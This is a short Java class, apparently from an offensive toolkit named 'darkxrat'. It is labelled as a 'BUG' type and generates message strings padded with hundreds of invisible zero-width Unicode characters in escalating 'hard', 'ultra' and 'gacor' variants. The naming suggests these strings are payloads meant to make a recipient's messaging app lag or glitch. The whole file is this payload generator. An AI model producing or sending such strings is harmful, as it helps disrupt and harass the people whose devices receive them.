package com.darkxrat.mantax.func.bug;

public class BlankXDelayInvisible {
    public static final String NAMA = "BLANK X DELAY INVISIBLE";
    public static final String TIPE = "BUG";

    public static String func() {
        return "\u2060".repeat(50) + "BLANK_X_DELAY_INVISIBLE" + "\u2060".repeat(50);
    }

    public static String funcHard() {
        return "\u2060".repeat(100) + "BLANK_X_DELAY_INVISIBLE_HARD" + "\u2060".repeat(100);
    }

    public static String funcUltra() {
        return "\u2060".repeat(200) + "BLANK_X_DELAY_INVISIBLE_ULTRA" + "\u2060".repeat(200);
    }

    public static String funcGacor() {
        return funcHard() + "\u200B" + funcUltra();
    }
}